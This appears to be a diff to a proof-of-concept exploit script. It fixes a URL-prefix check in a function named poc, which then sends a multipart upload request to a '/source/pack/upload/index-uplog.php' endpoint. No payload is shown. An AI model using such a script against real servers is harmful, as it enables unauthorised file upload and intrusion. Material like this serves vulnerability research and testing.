@@ -8,7 +8,7 @@ requests.packages.urllib3.disable_warnings()
 
 
 def poc(url):
-    if not url.startswith("http") or url.startswith('https'):
+    if not (url.startswith("http") or url.startswith('https')):
         url = 'http://' + url
     urls = url + '/source/pack/upload/index-uplog.php'
     m = MultipartEncoder(
